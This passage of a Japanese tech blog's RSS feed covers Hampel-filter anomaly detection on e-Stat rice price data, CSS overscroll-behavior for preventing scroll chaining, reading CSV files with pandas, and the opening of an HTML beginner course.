Seriesオブジェクトを使ってhampelメソッドを呼び出して異常値を検出する。&lt;/p>
&lt;p>ソースコードは以下の通り&lt;/p>
&lt;pre tabindex="0">&lt;code>import matplotlib.pyplot as plt
import pandas as pd
from hampel import hampel
# データ取得
df = pd.read_csv('./kome.csv')
print(df.columns)
print(df['value'])
input = pd.Series(df['value'])
rsts = hampel(input, window_size=5, n=3)
for rst in rsts:
print('%d:date:%s value:%d' % (rst,df['date'][rst],df['value'][rst]))
&lt;/code>&lt;/pre></description></item><item><title>s-Stat 時系列データで異常値を検知しよう（２）</title><link>https://suzukiiichiro.github.io/posts/2022-01-17-01-ani/</link><pubDate>Mon, 17 Jan 2022 10:51:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-17-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-17-01-ani/anal.jpg" alt="Featured image of post s-Stat 時系列データで異常値を検知しよう（２）" />&lt;h2 id="hampel-フィルタとは">hampel フィルタとは&lt;/h2>
&lt;p>時系列データの異常値検知で良いのないかなあと探しました。&lt;br>
最近は機械学習で時系列データの異常値検知をやっているものが結構ある感じでしたが、&lt;br>
e-Statの統計データですが年次や月次だったりするのでデータ数がそんなに多くないので機械学習はどうだろうと思い今回は機械学習以外の方法を探しました。&lt;br>
標準偏差などを利用して異常値を検出するアルゴリズムとしてHampelフィルターというものがありました。&lt;br>
pythonでhampelというライブラリーで簡単に利用できそうなのでまずこれを試してみます。&lt;/p>
&lt;h2 id="python-hampel-ライブラリを利用">python hampel ライブラリを利用&lt;/h2>
&lt;p>hampelはpip で簡単にインストールできます&lt;/p>
&lt;pre tabindex="0">&lt;code>pip install hampel
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>import matplotlib.pyplot as plt
import pandas as pd
from hampel import hampel
input=pd.Series([3, 2, 1 , 3 , 1, 2, 9, 2, 1, 22, 1, 1, 8])
rst = hampel(input, window_size=5, n=3)
print(&amp;quot;rst: &amp;quot;, rst)
bash-3.2$ python p.py
rst: [6, 9, 12]
&lt;/code>&lt;/pre>&lt;p>時系列データをpandasのSeriesに１次元で食わせて&lt;br>
hampelメソッドを呼び出すだけで簡単に異常値が検出できます。&lt;br>
異常値が検出された配列の番号が返却されます。&lt;br>
この例だと7個目の9,10個目の22,13個目の8です。&lt;br>
windon_size などは経験的にパラメータ調整するみたいです。&lt;/p>
&lt;p>次回は前回読み込んだcsvを使って異常値を検出するところまで行きたいと思います。&lt;/p></description></item><item><title>overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止</title><link>https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/</link><pubDate>Sat, 15 Jan 2022 12:16:02 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/intro.jpg" alt="Featured image of post overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止" />&lt;p>&lt;strong>出典元&lt;/strong>：&lt;a class="link" href="https://ishadeed.com/article/prevent-scroll-chaining-overscroll-behavior/" target="_blank" rel="noopener"
> Prevent Scroll Chaining With Overscroll Behavior - Ahmad Shadeed &lt;/a>&lt;/p>
&lt;p>&lt;code>position: fixed&lt;/code>の要素があるとしましょう。スクロールがある場合は、要素の下部の境界に到達すると、ブラウザはbody要素をスクロールし続けることに気付くでしょう。これは望ましくない混乱を招く効果です。ありがたいことに、CSSで修正できます。 この記事では、&lt;code>overscroll-behavior&lt;/code> CSSプロパティ、それが解決する問題、その仕組み、および使用場所について説明します。&lt;/p>
&lt;h2 id="はじめに">はじめに&lt;/h2>
&lt;p>非常に一般的な問題を取り上げましょう。ビューポートの中央に配置されたモーダルダイアログがあります。そのモーダルの下に、実際のWebページのコンテンツがあります。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 173;
flex-basis: 416px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/intro.jpg" data-size="980x565">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/intro.jpg"
width="980"
height="565"
loading="lazy"
alt="overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>モーダルコンテンツの最後に到達すると、ブラウザは代わりにメインページのコンテンツをスクロールし続けます。これはスクロールチェーンと呼ばれます。これはデフォルトの動作であり、&lt;code>overscroll-behavior&lt;/code>という新しいCSSプロパティでオーバーライドできるようになりました。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 208;
flex-basis: 501px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/intro-2.jpg" data-size="980x469">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/intro-2.jpg"
width="980"
height="469"
loading="lazy"
alt="overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>多くの場合、この動作は不要であり、ユーザーがモーダルコンテンツに集中できなくなる可能性があります。上の図では、モーダルの最後に到達したときに、ページがスクロールし続けていることに注目してください。&lt;/p>
&lt;h2 id="無理やり対応する">無理やり対応する&lt;/h2>
&lt;p>以前は、javascriptを介してbody要素に&lt;code>overflow: hidden&lt;/code>を適用することでこれを修正していました。モーダルが開かれると、オーバーフローの適用を担当するクラスが本体に追加されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">modal-open&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">overflow&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">hidden&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">modal&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">is-open&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">block&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>このやり方は、以前はデスクトップブラウザ間で完全に機能していましたが、iOS上のSafariでは動作しませんでした。これを機能させるには、body要素に&lt;code>position: fixed&lt;/code>を追加する必要もあります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="nt">body&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">modal-open&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">position&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">fixed&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">hidden&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="p">.&lt;/span>&lt;span class="nc">modal&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nc">is-open&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">display&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">block&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>これは機能しますが、ブラウザが一番上までスクロールし、ユーザーが手元のタスクから気をそらしてしまいます。これは、他の問題を引き起こす修正です。&lt;/p>
&lt;p>ベン・フレインによる &lt;a class="link" href="https://benfrain.com/preventing-body-scroll-for-modals-in-ios/" target="_blank" rel="noopener"
>記事&lt;/a> に固定されたものを除いて、私はその解決策を知りません。 ベンの記事のスニペットによると、モーダルがアクティブになったら、&lt;code>&amp;lt;body&amp;gt;&lt;/code>要素に以下を追加する必要があります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">bg-scrolling-element-when-modal-active&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="c">/* when modal active */&lt;/span>
&lt;span class="n">touch-action&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">none&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="kp">-webkit-&lt;/span>&lt;span class="n">overflow-scrolling&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">none&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">hidden&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="c">/* Other browsers */&lt;/span>
&lt;span class="n">overscroll-behavior&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">none&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>2018年にクライアントプロジェクトに取り組んだことを覚えています。そこでは、iOSのモバイルメニューの本文のスクロールを防ぐことはできないと彼に話しました。&lt;/p>
&lt;p>彼は：&lt;/p>
&lt;blockquote>
&lt;p>プログラミングで不可能なことは何もありません。解決策があると確信している。&lt;/p>
&lt;/blockquote>
&lt;p>といっていました。&lt;/p>
&lt;p>「プログラミング？」と思うかもしれませんが、それはCSSを指します。多くのことを試して、研究し続けましたが、完璧な解決策はありませんでした。&lt;/p>
&lt;p>それでは時間を遡って、&lt;code>overscroll-behavior&lt;/code>をソリューションに紹介したいと思います。&lt;/p>
&lt;h2 id="overscroll-behaviorについて">overscroll-behaviorについて&lt;/h2>
&lt;p>&lt;code>overscroll-behavior&lt;/code>プロパティは、スクロール領域の境界に到達したときにブラウザが実行する処理を設定します。 Safariを除くすべての主要なブラウザで[サポートされています。プロパティは、&lt;code>overscroll-behavior-x&lt;/code>および&lt;code>overscroll-behavior-y&lt;/code>の省略形です。 &lt;code>overscroll-behavior&lt;/code>を設定すると、両方の軸が設定されることに注意してください。&lt;/p>
&lt;p>設定可能な値を見てみましょう。&lt;/p>
&lt;h3 id="overscroll-behavior-auto">overscroll-behavior: auto&lt;/h3>
&lt;p>デフォルト値は &lt;code>auto&lt;/code> で、これによりスクロールチェーンが可能になります。スクロール要素があり、その境界に達すると、ブラウザは&lt;code>&amp;lt;body&amp;gt;&lt;/code>コンテンツをスクロールし続けます。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 189;
flex-basis: 454px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/overscroll-behaviour-auto.jpg" data-size="980x518">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/overscroll-behaviour-auto.jpg"
width="980"
height="518"
loading="lazy"
alt="overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;div class="video-wrapper">
&lt;video
controls
src="overscroll-auto.mp4"
autoplay
>
&lt;p>
Your browser doesn't support HTML5 video. Here is a
&lt;a href="overscroll-auto.mp4">link to the video&lt;/a> instead.
&lt;/p>
&lt;/video>
&lt;/div>
&lt;h3 id="overscroll-behavior-contain">overscroll-behavior: contain&lt;/h3>
&lt;p>その名前から、値&lt;code>contain&lt;/code>には、要素の境界内にスクロールが含まれます。次の図では、スクロールは青い輪郭のラッパー内に含まれています。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 189;
flex-basis: 454px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/overscroll-behaviour-contain.jpg" data-size="980x518">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/overscroll-behaviour-contain.jpg"
width="980"
height="518"
loading="lazy"
alt="overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;div class="video-wrapper">
&lt;video
controls
src="overscroll-contain.mp4"
autoplay
>
&lt;p>
Your browser doesn't support HTML5 video. Here is a
&lt;a href="overscroll-contain.mp4">link to the video&lt;/a> instead.
&lt;/p>
&lt;/video>
&lt;/div>
&lt;h3 id="overscroll-behavior-none">overscroll-behavior: none&lt;/h3>
&lt;p>&lt;code>none&lt;/code>を設定すると、 &lt;code>contains&lt;/code> と同様の効果があり、 &lt;strong>さらに&lt;/strong> ページの上部または下部に達したときのバウンス効果を防ぎます。&lt;/p>
&lt;h2 id="ユースケースと例">ユースケースと例&lt;/h2>
&lt;p>&lt;code>overscroll-behavior&lt;/code> がどのように機能するかがわかったところで、いくつかの便利なユースケースを見てみましょう。&lt;/p>
&lt;h3 id="モバイルナビゲーション">モバイルナビゲーション&lt;/h3>
&lt;p>モバイルナビゲーションが長すぎる場合、スクロールが速すぎると、本文のコンテンツでスクロールチェーンの問題が発生する可能性があります。&lt;/p>
&lt;p>次の図には、スクロール可能な長いナビゲーションリストがあります。&lt;br>
&lt;figure
class="gallery-image"
style="
flex-grow: 189;
flex-basis: 454px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/use-case-1.jpg" data-size="980x518">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/use-case-1.jpg"
width="980"
height="518"
loading="lazy"
alt="overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>スクロールが含まれていない場合は、本文のコンテンツもスクロールします。それを避けることができます&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">nav&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">overscroll-behavior-y&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">contain&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-y&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>動画で見てみましょう。&lt;br>
&lt;div class="video-wrapper">
&lt;video
controls
src="mobile-nav.mp4"
autoplay
>
&lt;p>
Your browser doesn't support HTML5 video. Here is a
&lt;a href="mobile-nav.mp4">link to the video&lt;/a> instead.
&lt;/p>
&lt;/video>
&lt;/div>
&lt;/p>
&lt;p>ナビゲーションの下に表示される半透明の背景を追加しました。 &lt;code>overscroll-behavior-y&lt;/code>プロパティをオフに切り替えたときの動作に注意してください。&lt;/p>
&lt;p>オフに切り替えると、ボディスクロールが発生します。&lt;/p>
&lt;p>ただし、ナビゲーションが短く（つまり、スクロールできない）、ユーザーが理由もなくスクロールしようとすると、&lt;code>overscroll-behavior-y: contain&lt;/code>であっても、本文がスクロールすることに注意してください。&lt;/p>
&lt;div class="video-wrapper">
&lt;video
controls
src="mobile-nav-2.mp4"
autoplay
>
&lt;p>
Your browser doesn't support HTML5 video. Here is a
&lt;a href="mobile-nav-2.mp4">link to the video&lt;/a> instead.
&lt;/p>
&lt;/video>
&lt;/div>
&lt;p>残念ながら、記事の冒頭で紹介した「無理やり対応」以外の修正方法はわかりません。&lt;/p>
&lt;h3 id="サイドナビゲーション">サイドナビゲーション&lt;/h3>
&lt;p>&lt;code>overscroll-behavior&lt;/code> のもう1つの便利な使用法は、サイドバーとメインがある場合です。その場合、サイドバーは固定されており、コンテンツが長すぎるとスクロール可能になる可能性があります。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 166;
flex-basis: 399px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/use-case-2.jpg" data-size="980x589">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/use-case-2.jpg"
width="980"
height="589"
loading="lazy"
alt="overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>サイドバーの端の境界に達したときにメインセクションがスクロールしないようにするには、次を追加する必要があります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">aside&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">overscroll-behavior-y&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">contain&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="チャットコンポーネント">チャットコンポーネント&lt;/h3>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 166;
flex-basis: 399px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/use-case-3.jpg" data-size="980x589">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/use-case-3.jpg"
width="980"
height="589"
loading="lazy"
alt="overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>Facebookに触発されたチャットコンポーネントは、 &lt;code>overscroll-behavior&lt;/code> の完璧なユースケースです。これを使用して、最後に到達したときにボディがスクロールしないようにできます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">aside&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">overscroll-behavior-y&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">contain&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="モーダルコンテンツ">モーダルコンテンツ&lt;/h3>
&lt;p>記事内で最初に行った例はモーダルなので、繰り返しません。ただし、モーダル内にリストが必要な場合があり、そのリストがスクロール可能である場合は、スクロールチェーンを発生させたくありません。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 166;
flex-basis: 399px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/use-case-4.jpg" data-size="980x589">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/use-case-4.jpg"
width="980"
height="589"
loading="lazy"
alt="overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>モーダルのオプションのリストに注意してください。これはスクロール可能なリストです。その境界に達すると、モーダルコンテンツがスクロールします。これを回避するには、 &lt;code>overscroll-behavior&lt;/code> を使用します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">list-wrapper&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">overscroll-behavior-y&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">contain&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">overflow-y&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">auto&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">max-height&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="mi">130&lt;/span>&lt;span class="kt">px&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="水平リスト">水平リスト&lt;/h3>
&lt;p>Facebookのホームページでこのユースケースを見つけました。ユーザーのリストがあるセクションがあり、次の図に示すように水平方向にスクロールします。&lt;/p>
&lt;p>&lt;figure
class="gallery-image"
style="
flex-grow: 269;
flex-basis: 646px"
>
&lt;a href="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/use-case-5.jpg" data-size="980x364">
&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-15-01-wyoshi/use-case-5.jpg"
width="980"
height="364"
loading="lazy"
alt="overflow: scroll で後ろまでスクロールするのを防ぐ方法 - スクロール連鎖の防止の画像"
>
&lt;/a>
&lt;/a>
&lt;/figure>&lt;/p>
&lt;p>これは&lt;code>overscroll-behavior-x&lt;/code>のベストな使い方です。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-css" data-lang="css">&lt;span class="p">.&lt;/span>&lt;span class="nc">list&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="n">overscroll-behavior-x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="kc">contain&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="まとめ">まとめ&lt;/h2>
&lt;p>CSS &lt;code>overscroll-behavior&lt;/code> は、何年も前に無理やり対応していた問題を解決する便利なプロパティです。&lt;/p>
&lt;h2 id="オススメの書籍">オススメの書籍&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%81%96%e3%81%a3%e3%81%8f%e3%82%8a%e3%81%a4%e3%81%8b%e3%82%80-CSS%e8%a8%ad%e8%a8%88-%e3%83%aa%e3%83%95%e3%83%ad%e3%83%bc%e7%89%88-%e9%ab%98%e6%b4%a5%e6%88%b8-%e5%a3%ae-ebook/dp/B09NKTJL73/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51up1uqI8bL.jpg" alt=" ざっくりつかむ　CSS設計[リフロー版] ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> ざっくりつかむ　CSS設計[リフロー版] &lt;/h2>
&lt;p>
Web制作の現場でこれだけは知っておきたい、CSSの扱い方、管理、運用の基本！
&lt;p>Web開発が複雑化した現在、CSSについても仕様や知識を知っているだけでは対応できない問題が増えています。&lt;/p>&lt;br>
&lt;span class="link">Amazonで詳細を見る&lt;/span>&lt;br>
&lt;/div>&lt;br>
&lt;/a>&lt;br>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>&lt;/p>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/%e3%83%97%e3%83%ad%e3%81%ae%e3%80%8c%e5%bc%95%e3%81%8d%e5%87%ba%e3%81%97%e3%80%8d%e3%82%92%e5%a2%97%e3%82%84%e3%81%99-HTML-CSS%e3%82%b3%e3%83%bc%e3%83%87%e3%82%a3%e3%83%b3%e3%82%b0%e3%81%ae%e5%bc%b7%e5%8c%96%e6%9b%b8-%e8%8d%89%e9%87%8e%e3%81%82%e3%81%91%e3%81%bf-ebook/dp/B09MH4Z3WH/?tag=nlpqueens-22" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51JMU4RenyL.jpg" alt=" プロの「引き出し」を増やす　HTML&amp;#43;CSSコーディングの強化書 ">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name"> プロの「引き出し」を増やす　HTML&amp;#43;CSSコーディングの強化書 &lt;/h2>
&lt;p>HTML・CSSの基本は覚えたけれど、デザインカンプから情報を読み取って、イチからコーディングするのはまだ無理……。
初心者を脱して、コーダー／マークアップエンジニアとして制作現場でバリバリ活躍する力をつけたい。
&lt;p>本書はそんな方に向けたものです。&lt;/p>&lt;br>
&lt;span class="link">Amazonで詳細を見る&lt;/span>&lt;br>
&lt;/div>&lt;br>
&lt;/a>&lt;br>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>&lt;/p>
&lt;/aside></description></item><item><title>s-Stat 時系列データで異常値を検知しよう（１）</title><link>https://suzukiiichiro.github.io/posts/2022-01-14-01-ani/</link><pubDate>Fri, 14 Jan 2022 13:40:13 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-14-01-ani/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-14-01-ani/anal.jpg" alt="Featured image of post s-Stat 時系列データで異常値を検知しよう（１）" />&lt;h2 id="s-stat-時系列データで異常値を検知しよう">s-Stat 時系列データで異常値を検知しよう&lt;/h2>
&lt;p>たくさんあるデータの中から関心の高そうな項目を抽出して表示しようというテーマでe-Statデータを取り扱っています。&lt;br>
関心の高そうな項目としては、キーワードが重要というのもあります。これは前回で取り扱ったテーマでgoogle検索などを利用してピックアップしてこうかなと考えております。&lt;br>
そのほか、値が急上昇、急下降したような場合も関心が高い項目と言えそうです。&lt;br>
今回は、データの中から値が急上昇、急下降した場合を抽出する方法を考えて行きたいと思います。&lt;/p>
&lt;p>webで検索した感じだと今回やりたいことは、時系列データの異常値を検知するというものみたいです。&lt;br>
方法を色々調べてみたのですがpython のhampel を使うのが簡単そうです。&lt;/p>
&lt;p>e-Statのapiを取得したcsvを利用しますので、まずpythonでcsvを取り扱う方法から調べる必要があります。&lt;/p>
&lt;h2 id="python-でcsvを取り扱う">python でcsvを取り扱う&lt;/h2>
&lt;p>今回は、pandasを利用することになるのでpandasでcsvを読み込むことにします。&lt;/p>
&lt;p>課題としては、商品の小売価格の変動が分かりやすいので「小売物価統計調査 小売物価統計調査（動向編） 」から札幌市のコシヒカリの値段を抜粋してcsvを作成したいと思います。&lt;/p>
&lt;pre tabindex="0">&lt;code>wget &amp;quot;http://api.e-stat.go.jp/rest/3.0/app/getSimpleStatsData?appId=xxxxxxxxx&amp;amp;lang=J&amp;amp;statsDataId=0003421913&amp;amp;metaGetFlg=Y&amp;amp;cntGetFlg=N&amp;amp;explanationGetFlg=Y&amp;amp;annotationGetFlg=Y&amp;amp;sectionHeaderFlg=1&amp;amp;replaceSpChars=0&amp;quot; -O kouri.csv
cat kouri.csv |grep &amp;quot;札幌市&amp;quot;|grep &amp;quot;1001 うるち米(単一原料米,「コシヒカリ」)&amp;quot;|awk -F, '{print $10&amp;quot;,&amp;quot;$13;}'|sed -e &amp;quot;s|\&amp;quot;||g&amp;quot;|sort -n &amp;gt;kome.csv
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>2002000101,2483
2002000202,2483
2002000303,2480
2002000404,2520
2002000505,2573
2002000606,2520
2002000707,2431
2002000808,2404
&lt;/code>&lt;/pre>&lt;p>こんな感じで年月と値段の２列のcsvになりました。&lt;br>
pythonのソースコードは以下の通り&lt;/p>
&lt;pre tabindex="0">&lt;code>import matplotlib.pyplot as plt
import pandas as pd
from hampel import hampel
df = pd.read_csv('./kome.csv')
print(df)
2002000101 2483
0 2002000202 2483
1 2002000303 2480
2 2002000404 2520
3 2002000505 2573
4 2002000606 2520
.. ... ...
233 2021000707 2470
234 2021000808 2443
&lt;/code>&lt;/pre>&lt;p>デリミタが「,」の時はdelimiter=&amp;quot;;&amp;ldquo;みたく第２引数で指定する必要はないみたいです。&lt;br>
csvの読み込み方はいろんなサイトに書かれているのですが、読み込んだcsvを操作する方法についてはすぐ出てこなかったので次回はpandasで読み込んだcsvを操作する方法を取り扱いと思います。&lt;/p></description></item><item><title>現役Webデザイナーが解説する初めてのHTML初心者講座</title><link>https://suzukiiichiro.github.io/posts/2022-01-13-01-wyoshi/</link><pubDate>Thu, 13 Jan 2022 14:14:30 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-01-13-01-wyoshi/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-01-13-01-wyoshi/image.jpg" alt="Featured image of post 現役Webデザイナーが解説する初めてのHTML初心者講座" />&lt;h2 id="はじめに">はじめに&lt;/h2>
&lt;p>HTMLをこれから始める人、HTMLってプログラムみたいで難しそうと思っている人、HTMLで挫折してしまった人。そういった人たちでもHTMLがわかるようになってほしいと思って「現役Webデザイナーが教えるHTML初心者講座」を始めてみました。&lt;/p>
&lt;p>まずは簡単にタグを覚える方法を紹介します。&lt;/p>
&lt;h2 id="htmlってなに">HTMLってなに？&lt;/h2>
&lt;p>HTMLとは（Hypertext Markup Language、ハイパーテキスト・マークアップ・ランゲージ）と呼ばれる言語のことで、書き方でタイトルや文章、箇条書き、画像の挿入ができたりします。&lt;/p>
&lt;p>たとえば&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">h1&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>タイトル&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">h1&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>文章&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">p&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nt">a&lt;/span> &lt;span class="na">href&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s">&amp;#34;#&amp;#34;&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>リンク&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">a&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>という内容であればヘッドラインと文章とリンクになります。&lt;/p>
